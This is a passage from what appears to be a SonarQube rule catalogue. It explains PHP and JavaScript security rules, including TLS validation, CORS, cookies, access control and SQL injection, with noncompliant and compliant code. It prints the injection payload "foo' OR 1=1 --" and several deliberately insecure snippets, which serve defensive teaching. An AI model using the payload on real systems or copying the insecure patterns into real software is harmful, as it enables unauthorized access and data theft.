  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/283">CWE-283 - Unverified Ownership</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man1/kill.1.html">kill(1) — Linux manual page</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man2/kill.2.html">kill(2) — Linux manual page</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4829">
              php:S4829
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337">CVE-2005-2337</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Sensitive Code Example</h2>
<pre>
// Any reference to STDIN is Sensitive
$varstdin = STDIN; // Sensitive
stream_get_line(STDIN, 40); // Sensitive
stream_copy_to_stream(STDIN, STDOUT); // Sensitive
// ...


// Except those references as they can't create an injection vulnerability.
ftruncate(STDIN, 5); // OK
ftell(STDIN); // OK
feof(STDIN); // OK
fseek(STDIN, 5); // OK
fclose(STDIN); // OK


// STDIN can also be referenced like this
$mystdin = 'php://stdin'; // Sensitive

file_get_contents('php://stdin'); // Sensitive
readfile('php://stdin'); // Sensitive

$input = fopen('php://stdin', 'r'); // Sensitive
fclose($input); // OK
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4823">
              php:S4823
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281">CVE-2018-7281</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326">CVE-2018-12326</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>Sensitive Code Example</h2>
<p>Builtin access to <code>$argv</code></p>
<pre>
function globfunc() {
    global $argv; // Sensitive. Reference to global $argv
    foreach ($argv as $arg) { // Sensitive.
        // ...
    }
}

function myfunc($argv) {
    $param = $argv[0]; // OK. Reference to local $argv parameter
    // ...
}

foreach ($argv as $arg) { // Sensitive. Reference to $argv.
    // ...
}

$myargv = $_SERVER['argv']; // Sensitive. Equivalent to $argv.

function serve() {
    $myargv = $_SERVER['argv']; // Sensitive.
    // ...
}

myfunc($argv); // Sensitive

$myvar = $HTTP_SERVER_VARS[0]; // Sensitive. Note: HTTP_SERVER_VARS has ben removed since PHP 5.4.

$options = getopt('a:b:'); // Sensitive. Parsing arguments.

$GLOBALS["argv"]; // Sensitive. Equivalent to $argv.

function myglobals() {
    $GLOBALS["argv"]; // Sensitive
}

$argv = [1,2,3]; // Sensitive. It is a bad idea to override argv.
</pre>
<p>Zend Console</p>
<pre>
new Zend\Console\Getopt(['myopt|m' =&gt; 'this is an option']); // Sensitive
</pre>
<p>Getopt-php library</p>
<pre>
new \GetOpt\Option('m', 'myoption', \GetOpt\GetOpt::REQUIRED_ARGUMENT); // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/214">CWE-214 - Information Exposure Through Process Environment</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4830">
              php:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.
Certificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>
<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in cURL</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by setting <code>CURLOPT_SSL_VERIFYPEER</code> to <code>false</code>. To enable validation set the value
to <code>true</code> or do not set <code>CURLOPT_SSL_VERIFYPEER</code> at all to use the secure default value.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://example.com/');
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // Noncompliant
curl_exec($curl);
curl_close($curl);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://example.com/');
curl_exec($curl);
curl_close($curl);
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/295">CWE-295 - Improper Certificate Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6339">
              php:S6339
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Secret keys are used in combination with an algorithm to encrypt data. A typical use case is an authentication system. For such a system to be
secure, the secret key should have a value which cannot be guessed and which is long enough to not be vulnerable to brute-force attacks.</p>
<p>A "salt" is an extra piece of data which is included when hashing data such as a password. Its value should have the same properties as a secret
key.</p>
<p>This rule raises an issue when it detects that a secret key or a salt has a predictable value or that it’s not long enough.</p>
<h3>Noncompliant code example</h3>
<p>WordPress:</p>
<pre>
define('AUTH_KEY', 'hello'); // Noncompliant
define('AUTH_SALT', 'hello'); // Noncompliant
define('AUTH_KEY', 'put your unique phrase here'); // Noncompliant, this is the default value
</pre>
<h3>Compliant solution</h3>
<p>WordPress:</p>
<pre>
define('AUTH_KEY', 'D&amp;ovlU#|CvJ##uNq}bel+^MFtT&amp;.b9{UvR]g%ixsXhGlRJ7q!h}XWdEC[BOKXssj');
define('AUTH_SALT', 'FIsAsXJKL5ZlQo)iD-pt??eUbdc{_Cn&lt;4!d~yqz))&amp;B D?AwK%)+)F2aNwI|siOe');
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> <a href="https://wordpress.org/support/article/editing-wp-config-php/#security-keys">wordpress.org</a> - WordPress Security Keys </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5808">
              php:S5808
            </a>
          </td>
          <td>
            <details>
              <p>When granting users access to resources of an application, such an authorization should be based on strong decisions. For instance, a user may be
authorized to access a resource only if they are authenticated, or if they have the correct role and privileges.</p>
<h2>Why is this an issue?</h2>
<p>Access control is a critical aspect of web frameworks that ensures proper authorization and restricts access to sensitive resources or actions. To
enable access control, web frameworks offer components that are responsible for evaluating user permissions and making access control decisions. They
might examine the user’s credentials, such as roles or privileges, and compare them against predefined rules or policies to determine whether the user
should be granted access to a specific resource or action.</p>
<p>Conventionally, these checks should never grant access to every request received. If an endpoint or component is meant to be public, then it should
be ignored by access control components. Conversely, if an endpoint should deny some users from accessing it, then access control has to be configured
correctly for this endpoint.</p>
<p>Granting unrestricted access to all users can lead to security vulnerabilities and potential misuse of critical functionalities. It is important to
carefully assess access decisions based on factors such as user roles, resource sensitivity, and business requirements. Implementing a robust and
granular access control mechanism is crucial for the security and integrity of the web application itself and its surrounding environment.</p>
<h3>What is the potential impact?</h3>
<p>Not verifying user access strictly can introduce significant security risks. Some of the most prominent risks are listed below. Depending on the
use case, it is very likely that other risks are introduced on top of the ones listed.</p>
<h4>Unauthorized access</h4>
<p>As the access of users is not checked strictly, it becomes very easy for an attacker to gain access to restricted areas or functionalities,
potentially compromising the confidentiality, integrity, and availability of sensitive resources. They may exploit this access to perform malicious
actions, such as modifying or deleting data, impersonating legitimate users, or gaining administrative privileges, ultimately compromising the
security of the system.</p>
<h4>Theft of sensitive data</h4>
<p>Theft of sensitive data can result from incorrect access control if attackers manage to gain access to databases, file systems, or other storage
mechanisms where sensitive data is stored. This can lead to the theft of personally identifiable information (PII), financial data, intellectual
property, or other confidential information. The stolen data can be used for various malicious purposes, such as identity theft, financial fraud, or
selling the data on the black market, causing significant harm to individuals and organizations affected by the breach.</p>
<h2>How to fix it in Symfony</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>The <code>vote</code> method of a <a href="https://symfony.com/doc/current/security/voters.html">VoterInterface</a> implementation is not compliant
when it returns only an affirmative decision (<code>ACCESS_GRANTED</code>):</p>
<pre data-diff-id="201" data-diff-type="noncompliant">
class NoncompliantVoter implements VoterInterface
{
    public function vote(TokenInterface $token, $subject, array $attributes)
    {
        return self::ACCESS_GRANTED; // Noncompliant
    }
}
</pre>
<p>The <code>voteOnAttribute</code> method of a <a href="https://symfony.com/doc/current/security/voters.html">Voter</a> class is not compliant when
it returns only an affirmative decision (<code>true</code>):</p>
<pre data-diff-id="202" data-diff-type="noncompliant">
class NoncompliantVoter extends Voter
{
    protected function supports(string $attribute, $subject)
    {
        return true;
    }

    protected function voteOnAttribute(string $attribute, $subject, TokenInterface $token)
    {
        return true; // Noncompliant
    }
}
</pre>
<h4>Compliant solution</h4>
<p>The <code>vote</code> method of a <a href="https://symfony.com/doc/current/security/voters.html">VoterInterface</a> type should return a negative
decision (<code>ACCESS_DENIED</code>) or abstain from making a decision (<code>ACCESS_ABSTAIN</code>):</p>
<pre data-diff-id="201" data-diff-type="compliant">
class CompliantVoter implements VoterInterface
{
    public function vote(TokenInterface $token, $subject, array $attributes)
    {
        if (foo()) {
            return self::ACCESS_GRANTED;
        } else if (bar()) {
            return self::ACCESS_ABSTAIN;
        }
        return self::ACCESS_DENIED;
    }
}
</pre>
<p>The <code>voteOnAttribute</code> method of a <a href="https://symfony.com/doc/current/security/voters.html">Voter</a> type should return a negative
decision (<code>false</code>):</p>
<pre data-diff-id="202" data-diff-type="compliant">
class CompliantVoter extends Voter
{
    protected function supports(string $attribute, $subject)
    {
        return true;
    }

    protected function voteOnAttribute(string $attribute, $subject, TokenInterface $token)
    {
        if (foo()) {
            return true;
        }
        return false;
    }
}
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/285">CWE-285 - Improper Authorization</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4834">
              php:S4834
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>The access control of an application must be properly implemented in order to restrict access to resources to authorized entities otherwise this
could lead to vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999">CVE-2018-12999</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285">CVE-2018-10285</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455">CVE-2017-7455</a> </li>
</ul>
<p>Granting correct permissions to users, applications, groups or roles and defining required permissions that allow access to a resource is
sensitive, must therefore be done with care. For instance, it is obvious that only users with administrator privilege should be authorized to
add/remove the administrator permission of another user.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Granted permission to an entity (user, application) allow access to information or functionalities not needed by this entity. </li>
  <li> Privileges are easily acquired (eg: based on the location of the user, type of device used, defined by third parties, does not require approval
  …​). </li>
  <li> Inherited permission, default permission, no privileges (eg: anonymous user) is authorized to access to a protected resource. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>At minimum, an access control system should:</p>
<ul>
  <li> Use a well-defined access control model like <a href="https://en.wikipedia.org/wiki/Role-based_access_control">RBAC</a> or <a
  href="https://en.wikipedia.org/wiki/Access-control_list">ACL</a>. </li>
  <li> Entities' permissions should be reviewed regularly to remove permissions that are no longer needed. </li>
  <li> Respect <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a> ("<em>an entity has access
  only the information and resources that are necessary for its legitimate purpose</em>"). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>CakePHP</p>
<pre>
use Cake\Auth\BaseAuthorize;
use Cake\Controller\Controller;

abstract class MyAuthorize extends BaseAuthorize { // Sensitive. Method extending Cake\Auth\BaseAuthorize.
    // ...
}

// Note that "isAuthorized" methods will only be detected in direct subclasses of Cake\Controller\Controller.
abstract class MyController extends Controller {
    public function isAuthorized($user) { // Sensitive. Method called isAuthorized in a Cake\Controller\Controller.
        return false;
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/276">CWE-276 - Incorrect Default Permissions</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/277">CWE-277 - Insecure Inherited Permissions</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5122">
              php:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269">CVE-2018-0269</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460">CVE-2017-14460</a> </li>
</ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a
href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>
  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>
  <li> Your access control policy is dynamically defined by a user-controlled input like <a
  href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin"><code>origin</code></a> header. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>
  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>PHP built-in header function:</p>
<pre>
header("Access-Control-Allow-Origin: *"); // Sensitive
</pre>
<p>Laravel:</p>
<pre>
response()-&gt;header('Access-Control-Allow-Origin', "*"); // Sensitive
</pre>
<p>Symfony:</p>
<pre>
use Symfony\Component\HttpFoundation\Response;

$response = new Response(
    'Content',
    Response::HTTP_OK,
    ['Access-Control-Allow-Origin' =&gt; '*'] // Sensitive
);
$response-&gt;headers-&gt;set('Access-Control-Allow-Origin', '*'); // Sensitive
</pre>
<p>User-controlled origin:</p>
<pre>
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\Request;

$origin = $request-&gt;headers-&gt;get('Origin');

$response-&gt;headers-&gt;set('Access-Control-Allow-Origin', $origin); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>PHP built-in header function:</p>
<pre>
header("Access-Control-Allow-Origin: $trusteddomain");
</pre>
<p>Laravel:</p>
<pre>
response()-&gt;header('Access-Control-Allow-Origin', $trusteddomain);
</pre>
<p>Symfony:</p>
<pre>
use Symfony\Component\HttpFoundation\Response;

$response = new Response(
    'Content',
    Response::HTTP_OK,
    ['Access-Control-Allow-Origin' =&gt; $trusteddomain]
);

$response-&gt;headers-&gt;set('Access-Control-Allow-Origin', $trusteddomain);
</pre>
<p>User-controlled origin validated with an allow-list:</p>
<pre>
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\Request;

$origin = $request-&gt;headers-&gt;get('Origin');

if (in_array($origin, $trustedOrigins)) {
    $response-&gt;headers-&gt;set('Access-Control-Allow-Origin', $origin);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">developer.mozilla.org</a> - CORS </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">developer.mozilla.org</a> - Same origin policy </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/346">CWE-346 - Origin Validation Error</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/942">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2092">
              php:S2092
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>
  <li> it’s not sure that the website contains <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content">mixed content</a> or not
  (ie HTTPS everywhere or not) </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li>
  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>In <em>php.ini</em> you can specify the flags for the session cookie which is security-sensitive:</p>
<pre>
session.cookie_secure = 0; // Sensitive: this security-sensitive session cookie is created with the secure flag set to false (cookie_secure = 0)
</pre>
<p>Same thing in PHP code:</p>
<pre>
session_set_cookie_params($lifetime, $path, $domain, false);
// Sensitive: this security-sensitive session cookie is created with the secure flag (the fourth argument) set to _false_
</pre>
<p>If you create a custom security-sensitive cookie in your PHP code:</p>
<pre>
$value = "sensitive data";
setcookie($name, $value, $expire, $path, $domain, false);  // Sensitive: a security-sensitive cookie is created with the secure flag  (the sixth argument) set to _false_
</pre>
<p>By default <a href="https://www.php.net/manual/en/function.setcookie.php"><code>setcookie</code></a> and <a
href="https://www.php.net/manual/en/function.setrawcookie.php"><code>setrawcookie</code></a> functions set the sixth argument / <code>secure</code>
flag to <em>false:</em></p>
<pre>
$value = "sensitive data";
setcookie($name, $value, $expire, $path, $domain);  // Sensitive: a security-sensitive cookie is created with the secure flag (the sixth argument) not defined (by default to false)
setrawcookie($name, $value, $expire, $path, $domain);  // Sensitive: a security-sensitive cookie is created with the secure flag (the sixth argument) not defined (by default to false)
</pre>
<h2>Compliant Solution</h2>
<pre>
session.cookie_secure = 1; // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to cookie_secure property set to 1
</pre>
<pre>
session_set_cookie_params($lifetime, $path, $domain, true); // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag (the fouth argument) set to true
</pre>
<pre>
$value = "sensitive data";
setcookie($name, $value, $expire, $path, $domain, true); // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag (the sixth  argument) set to true
setrawcookie($name, $value, $expire, $path, $domain, true);// Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag (the sixth argument) set to true
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/315">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/614">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S3649">
              jssecurity:S3649
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and
inserts it into a database query without sanitizing it first.</p>
<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>
<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the
vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data manipulation</h4>
<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread
impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Chaining DB injections with other vulnerabilities</h4>
<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul>
  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>
  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).
    <ul>
      <li> See <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/">our article on this topic</a> </li>
    </ul>  </li>
</ul>
<h2>How to fix it in Sequelize</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is
inserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some
characters may change the query logic to a malicious one.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
foo' OR 1=1 --
</pre>
<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in
as any user within the scoped user table.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
async function index(req, res) {
    const { db, User } = req.app.get('sequelize');

    const user = req.query.user;
    const pass = req.query.pass;

    let loggedInUser = await db.query(
        `SELECT * FROM users WHERE user = '${user}' AND pass = '${pass}'`,
        {
            model: User,
        }
    ); // Noncompliant

    res.send(JSON.stringify(loggedInUser));
    res.end();
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
async function index(req, res) {
    const { db, User, QueryTypes } = req.app.get('sequelize');

    const user = req.query.user;
    const pass = req.query.pass;

    let loggedInUser = await db.query(
        `SELECT * FROM users WHERE user = $user AND pass = $pass`,
        {
            bind: {
                user: user,
